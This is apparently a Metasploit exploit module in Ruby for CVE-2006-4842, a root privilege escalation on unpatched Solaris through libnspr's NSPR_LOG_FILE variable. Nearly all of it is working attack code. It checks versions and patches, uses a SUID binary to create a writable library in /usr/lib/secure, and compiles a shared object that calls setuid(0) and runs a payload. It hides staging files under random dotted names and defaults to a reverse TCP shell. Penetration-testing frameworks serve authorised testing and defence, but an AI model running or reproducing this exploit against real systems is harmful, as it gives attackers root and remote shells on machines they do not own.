# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Solaris::Priv
  include Msf::Post::Solaris::System
  include Msf::Post::Solaris::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Solaris libnspr NSPR_LOG_FILE Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits an arbitrary file write vulnerability in the
        Netscape Portable Runtime library (libnspr) on unpatched Solaris systems
        prior to Solaris 10u3 which allows users to gain root privileges.

        libnspr versions prior to 4.6.3 allow users to specify a log file with
        the `NSPR_LOG_FILE` environment variable. The log file is created with
        the privileges of the running process, resulting in privilege escalation
        when used in combination with a SUID executable.

        This module writes a shared object to the trusted library directory
        `/usr/lib/secure` and runs the specified SUID binary with the shared
        object loaded using the `LD_LIBRARY_PATH` environment variable.

        This module has been tested successfully with libnspr version 4.5.1
        on Solaris 10u1 (01/06) (x86) and Solaris 10u2 (06/06) (x86).
      },
      &#039;References&#039;     =>
        [
          [&#039;BID&#039;, &#039;20471&#039;],
          [&#039;CVE&#039;, &#039;2006-4842&#039;],
          [&#039;EDB&#039;, &#039;2543&#039;],
          [&#039;EDB&#039;, &#039;2569&#039;],
          [&#039;EDB&#039;, &#039;2641&#039;],
          [&#039;URL&#039;, &#039;https://securitytracker.com/id/1017050&#039;],
          [&#039;URL&#039;, &#039;https://securitytracker.com/id/1017051&#039;],
          [&#039;URL&#039;, &#039;https://developer.mozilla.org/en-US/docs/Mozilla/Projects/NSPR&#039;],
          [&#039;URL&#039;, &#039;http://web.archive.org/web/20061118024339/http://labs.idefense.com:80/intelligence/vulnerabilities/display.php?id=418&#039;],
          [&#039;URL&#039;, &#039;http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1&#039;]
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;iDefense&#039;,     # Discovery
          &#039;Marco Ivaldi&#039;, # Exploit
          &#039;Brendan Coles&#039; # Metasploit
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 11 2006&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;solaris&#039;],
      &#039;Arch&#039;           => [ARCH_X86, ARCH_X64, ARCH_SPARC],
      &#039;Targets&#039;        => [[&#039;Auto&#039;, {}]],
      &#039;DefaultOptions&#039; =>
        {
          &#039;PAYLOAD&#039;     => &#039;solaris/x86/shell_reverse_tcp&#039;,
          &#039;WfsDelay&#039;    => 10,
          &#039;PrependFork&#039; => true
        },
      &#039;DefaultTarget&#039;  => 0))
    register_options [
      # Some useful example SUID executables:
      # * /usr/bin/cancel
      # * /usr/bin/chkey
      # * /usr/bin/lp
      # * /usr/bin/lpset
      # * /usr/bin/lpstat
      # * /usr/lib/lp/bin/netpr
      # * /usr/sbin/lpmove
      OptString.new(&#039;SUID_PATH&#039;, [true, &#039;Path to suid executable (must be linked to a vulnerable version of libnspr4.so)&#039;, &#039;/usr/bin/cancel&#039;])
    ]
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false]),
      OptString.new(&#039;WritableDir&#039;, [true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039;])
    ]
  end

  def suid_bin_path
    datastore[&#039;SUID_PATH&#039;]
  end

  def is_writable?(path)
    cmd_exec("[ -w #{path} ] && echo true").include? &#039;true&#039;
  end

  def mkdir(path)
    vprint_status "Creating directory &#039;#{path}&#039;"
    cmd_exec "mkdir -p &#039;#{path}&#039;"
    register_dir_for_cleanup path
  end

  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def upload_and_compile(path, data)
    upload "#{path}.c", data

    output = cmd_exec "PATH=$PATH:/usr/sfw/bin/:/opt/sfw/bin/ gcc -fPIC -shared -g -lc -o #{path} #{path}.c"
    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
  end

  def check
    unless setuid? suid_bin_path
      vprint_error "#{suid_bin_path} is not setuid"
      return CheckCode::Safe
    end
    vprint_good "#{suid_bin_path} is setuid"

    unless has_gcc?
      vprint_error &#039;gcc is not installed&#039;
      return CheckCode::Safe
    end
    vprint_good &#039;gcc is installed&#039;

    # libnspr versions 4.5.1, 4.6.1 and 4.6.2 are known to be vulnerable
    # Earlier versions may also be vulnerable
    libnspr_pkg_info = cmd_exec &#039;pkginfo -l SUNWpr&#039;
    libnspr_pkg_version = libnspr_pkg_info.scan(/VERSION:\s+([\d\.]+),/).flatten.first
    if libnspr_pkg_version.to_s.eql? &#039;&#039;
      vprint_error &#039;Could not determine libnspr version&#039;
      return CheckCode::Unknown
    end

    if Gem::Version.new(libnspr_pkg_version) >= Gem::Version.new(&#039;4.6.3&#039;)
      vprint_error "libnspr version #{libnspr_pkg_version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "libnspr version #{libnspr_pkg_version} appears to be vulnerable"

    # Solaris 10 versions prior to the 2006 patches are known to be vulnerable.
    # Solaris 8 and 9 (SunOS 5.8 and 5.9) are not affected by default,
    # however third-party software may also introduce a vulnerable version of the library.
    version = kernel_release
    if version.to_s.eql? &#039;&#039;
      vprint_error &#039;Could not determine Solaris version&#039;
      return CheckCode::Detected
    end

    unless Gem::Version.new(version) <= Gem::Version.new(&#039;5.10&#039;)
      vprint_error "Solaris version #{version} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Solaris version #{version} appears to be vulnerable"

    # The vulnerability was patched in various Solaris patches for different platforms.
    # For more information, see:
    # - http://web.archive.org/web/20061110164829/http://sunsolve.sun.com/search/document.do?assetkey=1-26-102658-1
    installed_patches = cmd_exec &#039;showrev -p&#039;
    [
      119214, # Solaris 10 (x86)   patch 119214-10
      119213, # Solaris 10 (SPARC) patch 119213-10
      119212, # Solaris 9  (x86)   patch 119212-10
      119211, # Solaris 9  (SPARC) patch 119211-10
      119209  # Solaris 8  (SPARC) patch 119209-10
    ].each do |patch|
      if installed_patches =~ / #{patch}-(\d+)/
        revision = $1.to_i
        if revision >= 10
          vprint_error "Solaris patch #{patch}-#{revision} has been applied"
          return CheckCode::Safe
        end
      end
    end
    vprint_good &#039;Solaris patches are not installed&#039;

    CheckCode::Appears
  end

  def exploit
    if is_root?
      fail_with Failure::BadConfig, &#039;Session already has root privileges&#039;
    end

    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    unless is_writable? datastore[&#039;WritableDir&#039;]
      fail_with Failure::BadConfig, "#{datastore[&#039;WritableDir&#039;]} is not writable"
    end

    # Create writable file in /usr/lib/secure
    lib_path = &#039;/usr/lib/secure&#039;
    lib_name = &#039;libldap.so.5&#039;

    vprint_status "Creating file #{lib_path}/#{lib_name}"
    cmd_exec &#039;umask 0&#039;
    cmd_exec "NSPR_LOG_MODULES=all:5 NSPR_LOG_FILE=\"#{lib_path}/#{lib_name}\" #{suid_bin_path}"
    cmd_exec "NSPR_LOG_FILE=#{lib_path}/#{lib_name} #{suid_bin_path}"
    cmd_exec &#039;umask 022&#039;

    unless is_writable? "#{lib_path}/#{lib_name}"
      fail_with Failure::Unknown, "Could not create file &#039;#{lib_path}/#{lib_name}&#039;"
    end

    print_good "Created file #{lib_path}/#{lib_name}"
    register_file_for_cleanup "#{lib_path}/#{lib_name}"

    # Upload and compile shared object
    base_path = "#{datastore[&#039;WritableDir&#039;]}/.#{rand_text_alphanumeric 5..10}"
    mkdir base_path

    payload_name = ".#{rand_text_alphanumeric 5..10}"
    payload_path = "#{base_path}/#{payload_name}"

    so = <<-EOF
      void __attribute__((constructor)) cons() {
        setuid(0);
        setgid(0);
        execle("#{payload_path}", "", 0, 0);
        _exit(0);
      }
    EOF

    so_name = ".#{rand_text_alphanumeric 5..10}"
    so_path = "#{base_path}/#{so_name}"
    upload_and_compile so_path, so

    vprint_status "Writing shared object #{lib_path}/#{lib_name}"
    cmd_exec "cp &#039;#{so_path}&#039; &#039;#{lib_path}/#{lib_name}&#039;"
    register_file_for_cleanup "#{lib_path}/#{lib_name}"

    # Upload and execute payload
    upload payload_path, generate_payload_exe
    cmd_exec "chmod +x #{payload_path}"

    print_status &#039;Executing payload...&#039;
    cmd_exec "LD_LIBRARY_PATH=\"#{lib_path}\" #{suid_bin_path} & echo "
  end
end

